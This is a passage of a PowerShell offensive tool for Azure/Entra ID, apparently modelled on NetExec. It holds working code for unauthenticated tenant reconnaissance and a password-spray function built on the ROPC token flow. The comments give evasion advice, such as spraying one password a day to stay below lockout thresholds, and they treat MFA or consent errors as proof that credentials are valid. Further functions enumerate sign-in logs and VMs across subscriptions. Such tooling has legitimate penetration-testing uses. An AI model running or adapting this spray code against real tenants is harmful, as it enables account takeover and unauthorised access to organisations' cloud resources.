            Write-ColorOutput -Message "    2. Request Policy.Read.All permissions from your admin" -Color "Cyan"
            Write-ColorOutput -Message "    3. Ensure your account has appropriate directory roles" -Color "Cyan"
            
        } else {
            Write-ColorOutput -Message "[!] Failed to enumerate Conditional Access Policies" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Export if requested
    if ($ExportPath -and $policyData.Policies.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                # Export policies to CSV
                $policyData.Policies | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Policies exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                # Export full data to JSON
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Full policy data exported to: $ExportPath" -Color "Green"
            } else {
                # Default to JSON for complex data
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Full policy data exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export policies: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Conditional Access Policy review complete!" -Color "Green"
}

# Test if a tenant allows guest/external authentication (unauthenticated check)
function Test-GuestLoginEnabled {
    param(
        [string]$Domain
    )
    
    $result = [PSCustomObject]@{
        Domain = $Domain
        TenantExists = $false
        AcceptsExternalUsers = $false
        FederationType = "Unknown"
        AuthUrl = $null
        CloudInstanceName = $null
        NameSpaceType = $null
        DomainName = $null
        IsFederated = $false
        ThrottleStatus = $null
        Error = $null
    }
    
    try {
        # Method 1: Use GetCredentialType to check if external users are accepted
        # This checks what happens when we try to authenticate with an email from this domain
        $testEmail = "guesttest_$([guid]::NewGuid().ToString().Substring(0,8))@$Domain"
        
        $body = @{
            username = $testEmail
            isOtherIdpSupported = $true
            checkPhones = $false
            isRemoteNGCSupported = $true
            isCookieBannerShown = $false
            isFidoSupported = $true
            forceotclogin = $false
            otclogindisallowed = $false
            isExternalFederationDisallowed = $false
            isRemoteConnectSupported = $false
            federationFlags = 0
            isSignup = $false
            flowToken = ""
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        $result.TenantExists = $true
        $result.ThrottleStatus = $response.ThrottleStatus
        
        # Check if federation/external identity is supported
        if ($response.EstsProperties) {
            if ($response.EstsProperties.DomainType) {
                $result.NameSpaceType = $response.EstsProperties.DomainType
            }
        }
        
        # Check credentials type - this tells us about federation
        if ($response.Credentials) {
            if ($response.Credentials.FederationRedirectUrl) {
                $result.IsFederated = $true
                $result.AuthUrl = $response.Credentials.FederationRedirectUrl
            }
        }
        
        # Method 2: Check OpenID config for more details
        $openIdUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdUrl -Method Get -ErrorAction Stop
            
            if ($openIdConfig.issuer) {
                $result.TenantExists = $true
                
                if ($openIdConfig.tenant_region_scope) {
                    $result.CloudInstanceName = $openIdConfig.tenant_region_scope
                }
            }
        } catch {
            # OpenID might not be accessible for all tenants
        }
        
        # Method 3: Check realm discovery endpoint for B2B settings
        $realmUrl = "https://login.microsoftonline.com/common/userrealm/$testEmail`?api-version=2.0"
        try {
            $realmInfo = Invoke-RestMethod -Uri $realmUrl -Method Get -ErrorAction Stop
            
            if ($realmInfo) {
                $result.NameSpaceType = $realmInfo.NameSpaceType
                $result.DomainName = $realmInfo.DomainName
                $result.FederationType = $realmInfo.FederationBrandName
                $result.AuthUrl = $realmInfo.AuthUrl
                
                if ($realmInfo.NameSpaceType -eq "Managed") {
                    $result.IsFederated = $false
                    $result.AcceptsExternalUsers = $true  # Managed domains typically accept B2B
                } elseif ($realmInfo.NameSpaceType -eq "Federated") {
                    $result.IsFederated = $true
                    $result.AcceptsExternalUsers = $true  # Federated domains also support B2B
                } elseif ($realmInfo.NameSpaceType -eq "Unknown") {
                    # Unknown namespace might indicate external users are not accepted
                    $result.AcceptsExternalUsers = $false
                }
            }
        } catch {
            # Realm might not be accessible
        }
        
    } catch {
        $result.Error = $_.Exception.Message
        
        if ($_.Exception.Response.StatusCode -eq 400) {
            $result.TenantExists = $false
        }
    }
    
    return $result
}

# Test guest authentication with credentials (password spray style)
# ============================================
# PASSWORD SPRAY ATTACK - PHASE 2
# ============================================
# This function is Phase 2 of the password spray attack workflow
#
# FUNCTION: Test-GuestAuthentication
# PURPOSE: Validate username/password combinations using ROPC OAuth2 flow
# USAGE: Called by 'guest' command (.\azx.ps1 guest -UserFile users.txt -Password 'Pass123')
#
# HOW IT WORKS:
#   - Uses Resource Owner Password Credentials (ROPC) grant type
#   - Sends username/password directly to Azure Entra ID token endpoint
#   - Returns detailed authentication result including:
#     * Success/failure status
#     * MFA requirements (valid creds even if MFA blocks)
#     * Account lockout detection
#     * Password expiration detection
#     * Access token (if successful)
#
# DETECTION & OPSEC:
#   - Generates Azure Entra ID sign-in logs (failed authentication events)
#   - Multiple failed attempts may trigger account lockout
#   - Use delays between attempts (100ms default)
#   - Respect lockout thresholds (typically 5-10 failed attempts)
#   - For low-noise: spray 1 password per day across all users
#
# NETEXEC EQUIVALENT:
#   nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'
#   .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
#
# ERROR CODES:
#   - AADSTS50126: Invalid username or password
#   - AADSTS50053: Account locked (too many failed attempts)
#   - AADSTS50055: Password expired
#   - AADSTS50076/50079: MFA required (credentials ARE VALID!)
#   - AADSTS65001: Consent required (credentials ARE VALID!)
#   - AADSTS50034: User not found
#   - AADSTS7000218: ROPC flow disabled
#
# IMPORTANT: If MFA or Consent is required, credentials are VALID but additional
#           steps are needed. These results should be treated as successful
#           credential validation for password spray purposes.
#
# ============================================
function Test-GuestAuthentication {
    param(
        [string]$Username,
        [string]$Password,
        [string]$TenantId = "common"
    )
    
    $result = [PSCustomObject]@{
        Username = $Username
        Success = $false
        ErrorCode = $null
        ErrorDescription = $null
        TokenType = $null
        AccessToken = $null
        MFARequired = $false
        AccountLocked = $false
        PasswordExpired = $false
        ConsentRequired = $false
    }
    
    try {
        # Use Resource Owner Password Credential (ROPC) flow to test credentials
        # Using Azure PowerShell client ID (known public client)
        $clientId = "1950a258-227b-4e31-a9cf-717495945fc2"  # Azure PowerShell
        $scope = "https://graph.microsoft.com/.default openid profile offline_access"
        
        $body = @{
            grant_type = "password"
            client_id = $clientId
            scope = $scope
            username = $Username
            password = $Password
        }
        
        $tokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri $tokenUrl `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $body `
            -ErrorAction Stop
        
        $result.Success = $true
        $result.TokenType = $response.token_type
        $result.AccessToken = $response.access_token
        
    } catch {
        $errorResponse = $null
        
        try {
            if ($_.Exception.Response) {
                $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                $errorBody = $reader.ReadToEnd()
                $reader.Close()
                $errorResponse = $errorBody | ConvertFrom-Json
            }
        } catch {
            # Couldn't parse error response
        }
        
        if ($errorResponse) {
            $result.ErrorCode = $errorResponse.error
            $result.ErrorDescription = $errorResponse.error_description
            
            # Analyze error codes
            switch -Regex ($errorResponse.error_description) {
                "AADSTS50126" {
                    # Invalid username or password
                    $result.ErrorCode = "INVALID_CREDENTIALS"
                }
                "AADSTS50053" {
                    # Account locked
                    $result.AccountLocked = $true
                    $result.ErrorCode = "ACCOUNT_LOCKED"
                }
                "AADSTS50055" {
                    # Password expired
                    $result.PasswordExpired = $true
                    $result.ErrorCode = "PASSWORD_EXPIRED"
                }
                "AADSTS50076|AADSTS50079" {
                    # MFA required - credential is valid!
                    $result.MFARequired = $true
                    $result.Success = $true  # Credentials are valid, just need MFA
                    $result.ErrorCode = "MFA_REQUIRED"
                }
                "AADSTS65001" {
                    # Consent required
                    $result.ConsentRequired = $true
                    $result.Success = $true  # Credentials are valid
                    $result.ErrorCode = "CONSENT_REQUIRED"
                }
                "AADSTS50034" {
                    # User not found
                    $result.ErrorCode = "USER_NOT_FOUND"
                }
                "AADSTS50057" {
                    # Account disabled
                    $result.ErrorCode = "ACCOUNT_DISABLED"
                }
                "AADSTS50058" {
                    # Silent sign-in failed
                    $result.ErrorCode = "SILENT_SIGNIN_FAILED"
                }
                "AADSTS700016" {
                    # Application not found in tenant
                    $result.ErrorCode = "APP_NOT_FOUND"
                }
                "AADSTS7000218" {
                    # ROPC not allowed
                    $result.ErrorCode = "ROPC_DISABLED"
                }
                default {
                    $result.ErrorCode = $errorResponse.error
                }
            }
        } else {
            $result.ErrorDescription = $_.Exception.Message
        }
    }
    
    return $result
}

# Enumerate active Windows sessions (similar to nxc smb --qwinsta)
function Invoke-SessionEnumeration {
    param(
        [string]$Username,
        [string]$ExportPath,
        [int]$Hours = 24
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Active Session Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Sessions (Similar to: nxc smb --qwinsta)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Querying sign-in logs for last $Hours hours..." -Color "Cyan"
    
    # Initialize connection context
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        
        if (-not $context) {
            Write-ColorOutput -Message "[!] Not authenticated to Microsoft Graph" -Color "Red"
            Write-ColorOutput -Message "[*] Attempting authentication..." -Color "Yellow"
            
            # Connect with required permissions
            $requiredScopes = "AuditLog.Read.All,Directory.Read.All"
            Connect-GraphAPI -Scopes $requiredScopes
            $context = Get-MgContext
        }
        
        if ($context) {
            Write-ColorOutput -Message "[+] Authenticated as: $($context.Account)" -Color "Green"
            
            # Check if current user is guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "[!] Warning: Guest users typically have limited access to audit logs" -Color "Yellow"
            }
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to get authentication context: $($_.Exception.Message)" -Color "Red"
        return
    }
    
    # Calculate time filter
    $startTime = (Get-Date).AddHours(-$Hours).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] ACTIVE SIGN-IN SESSIONS" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    $sessions = @()
    $uniqueUsers = @{}
    
    try {
        # Build filter query
        $filterQuery = "createdDateTime ge $startTime"
        if ($Username) {
            $filterQuery += " and userPrincipalName eq '$Username'"
        }
        
        # Query sign-in logs
        Write-ColorOutput -Message "[*] Querying Azure Entra ID sign-in logs (this may take a moment)..." -Color "Cyan"
        
        $uri = "https://graph.microsoft.com/v1.0/auditLogs/signIns?`$filter=$filterQuery&`$top=999&`$orderby=createdDateTime desc"
        
        $allSignIns = @()
        do {
            $response = Invoke-MgGraphRequest -Uri $uri -Method GET -ErrorAction Stop
            $allSignIns += $response.value
            $uri = $response.'@odata.nextLink'
        } while ($uri)
        
        if ($allSignIns.Count -eq 0) {
            Write-ColorOutput -Message "[!] No sign-in events found in the last $Hours hours" -Color "Yellow"
            if ($Username) {
                Write-ColorOutput -Message "[!] No sign-ins found for user: $Username" -Color "Yellow"
            }
            return
        }
        
        Write-ColorOutput -Message "[+] Found $($allSignIns.Count) sign-in events" -Color "Green"
        Write-ColorOutput -Message ""
        
        # Process and display sessions
        foreach ($signIn in $allSignIns) {
            # Track unique users
            $userKey = $signIn.userPrincipalName
            if (-not $uniqueUsers.ContainsKey($userKey)) {
                $uniqueUsers[$userKey] = 0
            }
            $uniqueUsers[$userKey]++
            
            # Determine success/failure status
            $statusColor = if ($signIn.status.errorCode -eq 0) { "Green" } else { "Red" }
            $statusIcon = if ($signIn.status.errorCode -eq 0) { "+" } else { "!" }
            $statusText = if ($signIn.status.errorCode -eq 0) { "SUCCESS" } else { "FAILED" }
            
            # Format device info
            $deviceName = if ($signIn.deviceDetail.displayName) { 
                $signIn.deviceDetail.displayName 
            } else { 
                "Unknown Device" 
            }
            
            $deviceOS = if ($signIn.deviceDetail.operatingSystem) {
                $signIn.deviceDetail.operatingSystem
            } else {
                "Unknown OS"
            }
            
            # Format location
            $location = if ($signIn.location.city -and $signIn.location.countryOrRegion) {
                "$($signIn.location.city), $($signIn.location.countryOrRegion)"
            } elseif ($signIn.location.countryOrRegion) {
                $signIn.location.countryOrRegion
            } else {
                "Unknown Location"
            }
            
            # Format IP address
            $ipAddress = if ($signIn.ipAddress) { $signIn.ipAddress } else { "N/A" }
            
            # Format application
            $appName = if ($signIn.appDisplayName) { $signIn.appDisplayName } else { "Unknown App" }
            
            # Format timestamp
            $timestamp = ([DateTime]$signIn.createdDateTime).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
            
            # Risk level (if available)
            $riskLevel = if ($signIn.riskLevelDuringSignIn -and $signIn.riskLevelDuringSignIn -ne "none") {
                $signIn.riskLevelDuringSignIn.ToUpper()
            } else {
                $null
            }
            
            # MFA details
            $mfaRequired = $signIn.conditionalAccessStatus -eq "success" -or $signIn.authenticationRequirement -eq "multiFactorAuthentication"
            
            # Build session object
            $sessionObj = [PSCustomObject]@{
                Timestamp = $timestamp
                User = $signIn.userPrincipalName
                DisplayName = $signIn.userDisplayName
                Status = $statusText
                ErrorCode = $signIn.status.errorCode
                ErrorReason = $signIn.status.failureReason
                Application = $appName
                DeviceName = $deviceName
                OperatingSystem = $deviceOS
                Browser = $signIn.deviceDetail.browser
                IsCompliant = $signIn.deviceDetail.isCompliant
                IsManagedDevice = $signIn.deviceDetail.isManaged
                IPAddress = $ipAddress
                Location = $location
                RiskLevel = $riskLevel
                MFARequired = $mfaRequired
                ConditionalAccessStatus = $signIn.conditionalAccessStatus
                SessionId = $signIn.id
            }
            
            $sessions += $sessionObj
            
            # Display in netexec-style format
            # Handle null/empty userPrincipalName
            $displayUser = if ($signIn.userPrincipalName) { $signIn.userPrincipalName } else { $signIn.userDisplayName }
            if (-not $displayUser) { $displayUser = "Unknown User" }
            
            $userDisplay = $displayUser.PadRight(45)
            $ipDisplay = $ipAddress.PadRight(15)
            
            Write-ColorOutput -Message "AZR".PadRight(12) + $userDisplay + $ipDisplay + "[$statusIcon] $statusText" -Color $statusColor
            
            # Show display name if different from UPN
            if ($signIn.userDisplayName -and $signIn.userDisplayName -ne $displayUser) {
                Write-ColorOutput -Message "    Name:      $($signIn.userDisplayName)" -Color "DarkGray"
            }
            Write-ColorOutput -Message "    Time:      $timestamp" -Color "DarkGray"
            Write-ColorOutput -Message "    Device:    $deviceName ($deviceOS)" -Color "DarkGray"
            Write-ColorOutput -Message "    App:       $appName" -Color "DarkGray"
            Write-ColorOutput -Message "    Location:  $location" -Color "DarkGray"
            
            if ($mfaRequired) {
                Write-ColorOutput -Message "    MFA:       Required" -Color "Cyan"
            }
            
            if ($riskLevel) {
                $riskColor = switch ($riskLevel) {
                    "HIGH" { "Red" }
                    "MEDIUM" { "Yellow" }
                    default { "Cyan" }
                }
                Write-ColorOutput -Message "    Risk:      $riskLevel" -Color $riskColor
            }
            
            if ($signIn.status.errorCode -ne 0) {
                Write-ColorOutput -Message "    Error:     $($signIn.status.failureReason)" -Color "Red"
            }
            
            Write-ColorOutput -Message ""
        }
        
        # Summary statistics
        Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
        Write-ColorOutput -Message "[*] SESSION SUMMARY" -Color "Cyan"
        Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
        
        $successCount = ($sessions | Where-Object { $_.Status -eq "SUCCESS" }).Count
        $failedCount = ($sessions | Where-Object { $_.Status -eq "FAILED" }).Count
        $uniqueUserCount = $uniqueUsers.Count
        $mfaCount = ($sessions | Where-Object { $_.MFARequired -eq $true }).Count
        $riskyCount = ($sessions | Where-Object { $_.RiskLevel -ne $null }).Count
        
        Write-ColorOutput -Message "AZR".PadRight(12) + "Total Sign-ins:      $($sessions.Count)" -Color "Cyan"
        Write-ColorOutput -Message "AZR".PadRight(12) + "Unique Users:        $uniqueUserCount" -Color "Cyan"
        Write-ColorOutput -Message "AZR".PadRight(12) + "Successful:          $successCount" -Color "Green"
        if ($failedCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "Failed:              $failedCount" -Color "Red"
        }
        if ($mfaCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "MFA Protected:       $mfaCount" -Color "Cyan"
        }
        if ($riskyCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "Risky Sign-ins:      $riskyCount" -Color "Yellow"
        }
        
        # Top users
        if ($uniqueUsers.Count -gt 1) {
            Write-ColorOutput -Message "`n[*] Top Active Users:" -Color "Yellow"
            $topUsers = $uniqueUsers.GetEnumerator() | Sort-Object -Property Value -Descending | Select-Object -First 5
            foreach ($user in $topUsers) {
                Write-ColorOutput -Message "    $($user.Name): $($user.Value) sign-ins" -Color "DarkGray"
            }
        }
        
        # Top applications
        $appCounts = @{}
        foreach ($session in $sessions) {
            if (-not $appCounts.ContainsKey($session.Application)) {
                $appCounts[$session.Application] = 0
            }
            $appCounts[$session.Application]++
        }
        
        if ($appCounts.Count -gt 0) {
            Write-ColorOutput -Message "`n[*] Top Applications:" -Color "Yellow"
            $topApps = $appCounts.GetEnumerator() | Sort-Object -Property Value -Descending | Select-Object -First 5
            foreach ($app in $topApps) {
                Write-ColorOutput -Message "    $($app.Name): $($app.Value) sign-ins" -Color "DarkGray"
            }
        }
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                if ($extension -eq ".csv") {
                    $sessions | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                    Write-ColorOutput -Message "`n[+] Session data exported to: $ExportPath" -Color "Green"
                } elseif ($extension -eq ".json") {
                    $sessions | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                    Write-ColorOutput -Message "`n[+] Session data exported to: $ExportPath" -Color "Green"
                } elseif ($extension -eq ".html") {
                    $stats = [ordered]@{
                        "Total Sign-in Events" = $sessions.Count
                        "Unique Users" = $uniqueUsers.Count
                        "Successful Sign-ins" = $successCount
                        "Failed Sign-ins" = $failedCount
                        "Risky Sign-ins (HIGH RISK)" = $riskyCount
                        "MFA Required Sign-ins" = $mfaCount
                        "Time Range (Hours)" = $Hours
                    }
                    
                    $description = "Active sign-in session enumeration from Azure/Entra ID audit logs. Shows recent authentication events, device details, locations, and security risk levels."
                    
                    $success = Export-HtmlReport -Data $sessions -OutputPath $ExportPath -Title "Active Session Enumeration Report" -Statistics $stats -CommandName "sessions" -Description $description
                    
                    if ($success) {
                        Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                    }
                } else {
                    # Default to JSON
                    $sessions | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                    Write-ColorOutput -Message "`n[+] Session data exported to: $ExportPath" -Color "Green"
                }
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        Write-ColorOutput -Message "`n[*] Session enumeration complete!" -Color "Green"
        
    } catch {
        # Check if it's a permission error
        if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Insufficient privileges*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read sign-in logs" -Color "Red"
            Write-ColorOutput -Message "[*] Required permissions: AuditLog.Read.All or Directory.Read.All" -Color "Yellow"
            Write-ColorOutput -Message "[*] Guest users typically cannot access audit logs" -Color "Yellow"
        } else {
            Write-ColorOutput -Message "[!] Failed to enumerate sessions" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    return $sessions
}

# Enumerate logged-on users on Azure VMs (similar to nxc smb --logged-on-users or Remote Registry Service)
function Invoke-VMLoggedOnUsersEnumeration {
    param(
        [string]$ResourceGroup,
        [string]$SubscriptionId,
        [string]$VMFilter,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure VM Logged-On Users Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: VM-LoggedOn (Similar to: nxc smb --logged-on-users)" -Color "Yellow"
    Write-ColorOutput -Message "[*] This is the Azure equivalent of Remote Registry Service enumeration`n" -Color "Cyan"
    
    # Check and install required Az modules
    Write-ColorOutput -Message "[*] Checking required Az PowerShell modules..." -Color "Yellow"
    
    $requiredModules = @('Az.Accounts', 'Az.Compute', 'Az.Resources')
    $modulesToInstall = @()
    
    foreach ($module in $requiredModules) {
        if (-not (Get-Module -ListAvailable -Name $module)) {
            $modulesToInstall += $module
        }
    }
    
    if ($modulesToInstall.Count -gt 0) {
        Write-ColorOutput -Message "[!] Missing modules: $($modulesToInstall -join ', ')" -Color "Yellow"
        Write-ColorOutput -Message "[*] Installing missing modules..." -Color "Yellow"
        
        foreach ($module in $modulesToInstall) {
            try {
                Write-ColorOutput -Message "    [*] Installing $module..." -Color "Gray"
                Install-Module $module -Scope CurrentUser -Force -AllowClobber -ErrorAction Stop -Repository PSGallery
                Write-ColorOutput -Message "    [+] $module installed successfully" -Color "Green"
            } catch {
                Write-ColorOutput -Message "    [!] Failed to install $module" -Color "Red"
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "Red"
                Write-ColorOutput -Message "`n[*] Please install manually using:" -Color "Yellow"
                Write-ColorOutput -Message "    Install-Module $module -Scope CurrentUser -Force" -Color "Gray"
                Write-ColorOutput -Message "`n[*] Or install the full Az module:" -Color "Yellow"
                Write-ColorOutput -Message "    Install-Module Az -Scope CurrentUser -Force`n" -Color "Gray"
                return
            }
        }
        Write-ColorOutput -Message "[+] All required modules installed successfully" -Color "Green"
    } else {
        Write-ColorOutput -Message "[+] All required Az modules are already installed" -Color "Green"
    }
    
    # Import Az modules
    Write-ColorOutput -Message "[*] Importing Az modules..." -Color "Yellow"
    try {
        Import-Module Az.Accounts -ErrorAction Stop
        Import-Module Az.Compute -ErrorAction Stop
        Import-Module Az.Resources -ErrorAction Stop
        Write-ColorOutput -Message "[+] Az modules imported successfully`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to import Az modules" -Color "Red"
        Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        Write-ColorOutput -Message "`n[*] Try manually importing:" -Color "Yellow"
        Write-ColorOutput -Message "    Import-Module Az.Accounts" -Color "Gray"
        Write-ColorOutput -Message "    Import-Module Az.Compute" -Color "Gray"
        Write-ColorOutput -Message "    Import-Module Az.Resources`n" -Color "Gray"
        return
    }
    
    # Check if authenticated to Azure
    try {
        $azContext = Get-AzContext -ErrorAction Stop
        
        if (-not $azContext) {
            Write-ColorOutput -Message "[!] Not authenticated to Azure" -Color "Red"
            Write-ColorOutput -Message "[*] Attempting authentication..." -Color "Yellow"
            Write-ColorOutput -Message "[*] Note: You may see warnings about tenants requiring MFA - these are informational only`n" -Color "Cyan"
            
            # Suppress most Azure warnings but keep critical errors
            Connect-AzAccount -ErrorAction Stop -WarningAction SilentlyContinue | Out-Null
            $azContext = Get-AzContext
        }
        
        if ($azContext) {
            Write-ColorOutput -Message "[+] Authenticated as: $($azContext.Account.Id)" -Color "Green"
            Write-ColorOutput -Message "[+] Subscription: $($azContext.Subscription.Name) ($($azContext.Subscription.Id))" -Color "Green"
            
            # Check user's RBAC roles (informational only - may not detect inherited or group-based permissions)
            Write-ColorOutput -Message "[*] Checking Azure RBAC permissions (informational)..." -Color "Yellow"
            try {
                $roleAssignments = Get-AzRoleAssignment -SignInName $azContext.Account.Id -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
                
                if ($roleAssignments -and $roleAssignments.Count -gt 0) {
                    $relevantRoles = $roleAssignments | Where-Object { 
                        $_.RoleDefinitionName -match "Reader|Contributor|Virtual Machine|Owner" 
                    }
                    
                    if ($relevantRoles.Count -gt 0) {
                        Write-ColorOutput -Message "[+] Direct RBAC role assignments found:" -Color "Green"
                        $roleGroups = $relevantRoles | Group-Object RoleDefinitionName
                        foreach ($group in $roleGroups) {
                            $scopeInfo = $group.Group | ForEach-Object {
                                if ($_.Scope -match "/subscriptions/[^/]+$") { "Subscription" } 
                                elseif ($_.Scope -match "/resourceGroups/([^/]+)") { "RG: $($matches[1])" }
                                else { "Other" }
                            }
                            $uniqueScopes = ($scopeInfo | Select-Object -Unique) -join ", "
                            Write-ColorOutput -Message "    • $($group.Name) ($uniqueScopes)" -Color "Gray"
                        }
                        
                        # Check if user has sufficient permissions for VM enumeration
                        $hasReader = $relevantRoles | Where-Object { $_.RoleDefinitionName -match "Reader|Contributor|Owner" }
                        $hasVMAccess = $relevantRoles | Where-Object { $_.RoleDefinitionName -match "Virtual Machine|Contributor|Owner" }
                        
                        if (-not $hasReader) {
                            Write-ColorOutput -Message "[!] Note: No direct Reader/Contributor role - you may have inherited permissions" -Color "Cyan"
                        }
                        if (-not $hasVMAccess) {
                            Write-ColorOutput -Message "[!] Note: No direct VM roles - you may have group-based or inherited permissions" -Color "Cyan"
                        }
                    } else {
                        Write-ColorOutput -Message "[*] No direct VM-related roles found (you may have group-based or inherited permissions)" -Color "Cyan"
                    }
                } else {
                    Write-ColorOutput -Message "[*] No direct role assignments detected (you may have group-based or inherited permissions)" -Color "Cyan"
                }
                Write-ColorOutput -Message "[*] Proceeding with VM enumeration - actual permissions will be tested..." -Color "Cyan"
            } catch {
                # Silent failure - permission check is informational only
                Write-ColorOutput -Message "[*] Proceeding with VM enumeration..." -Color "Cyan"
            }
            
            Write-Host ""
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to get Azure context: $($_.Exception.Message)" -Color "Red"
        Write-ColorOutput -Message "[*] Please authenticate using: Connect-AzAccount" -Color "Yellow"
        return
    }
    
    # Determine which subscriptions to enumerate
    $subscriptionsToScan = @()
    
    if ($SubscriptionId) {
        # User specified a specific subscription
        try {
            $targetSub = Get-AzSubscription -SubscriptionId $SubscriptionId -ErrorAction Stop
            $subscriptionsToScan = @($targetSub)
            Write-ColorOutput -Message "[*] Target subscription: $($targetSub.Name) ($($targetSub.Id))`n" -Color "Cyan"
        } catch {
            Write-ColorOutput -Message "[!] Failed to find subscription: $SubscriptionId" -Color "Red"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "Red"
            Write-ColorOutput -Message "`n[*] List available subscriptions:" -Color "Yellow"
            Write-ColorOutput -Message "    Get-AzSubscription | Format-Table Name, Id, State`n" -Color "Gray"
            return
        }
    } else {
        # Enumerate all accessible subscriptions
        try {
            $allSubs = Get-AzSubscription -ErrorAction Stop -WarningAction SilentlyContinue | Where-Object { $_.State -eq 'Enabled' }
            $subscriptionsToScan = @($allSubs)
            
            if ($subscriptionsToScan.Count -eq 0) {
                Write-ColorOutput -Message "[!] No enabled subscriptions found" -Color "Red"
                return
            }
            
            Write-ColorOutput -Message "[*] Found $($subscriptionsToScan.Count) enabled subscription(s):" -Color "Cyan"
            $currentSubId = $azContext.Subscription.Id
            foreach ($sub in $subscriptionsToScan) {
                $isCurrent = if ($sub.Id -eq $currentSubId) { " [CURRENT]" } else { "" }
                $tenantInfo = if ($sub.TenantId) { " | Tenant: $($sub.TenantId)" } else { "" }
                Write-ColorOutput -Message "    • $($sub.Name)$isCurrent" -Color $(if ($sub.Id -eq $currentSubId) { "Green" } else { "Gray" })
                Write-ColorOutput -Message "      ID: $($sub.Id)$tenantInfo" -Color "DarkGray"
            }
            Write-ColorOutput -Message "`n[*] Will enumerate VMs across all subscriptions (use -SubscriptionId to target specific subscription)`n" -Color "Yellow"
        } catch {
            Write-ColorOutput -Message "[!] Failed to retrieve subscriptions: $($_.Exception.Message)" -Color "Red"
            return
        }
    }
    
    # Global counters across all subscriptions
    $exportData = @()
    $totalLoggedOnUsers = 0
    $successfulQueries = 0
    $failedQueries = 0
    $totalVMsFound = 0
    $totalVMsQueried = 0
    
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] MULTI-SUBSCRIPTION VM ENUMERATION" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Loop through each subscription
    foreach ($subscription in $subscriptionsToScan) {
        Write-ColorOutput -Message "[*] --------------------------------------------------" -Color "Cyan"
        Write-ColorOutput -Message "[*] Subscription: $($subscription.Name)" -Color "White"
        Write-ColorOutput -Message "[*] ID: $($subscription.Id)" -Color "Gray"
        Write-ColorOutput -Message "[*] --------------------------------------------------`n" -Color "Cyan"
        
        # Switch to this subscription
        try {
            # Try to set context with tenant ID for better compatibility
            if ($subscription.TenantId) {
                Set-AzContext -SubscriptionId $subscription.Id -TenantId $subscription.TenantId -ErrorAction Stop -WarningAction SilentlyContinue | Out-Null
            } else {
                Set-AzContext -SubscriptionId $subscription.Id -ErrorAction Stop -WarningAction SilentlyContinue | Out-Null
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to switch to subscription: $($subscription.Name)" -Color "Red"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "Red"
            
            # Check if it's a tenant/authentication issue
            if ($_.Exception.Message -like "*tenant*" -or $_.Exception.Message -like "*authentication*") {
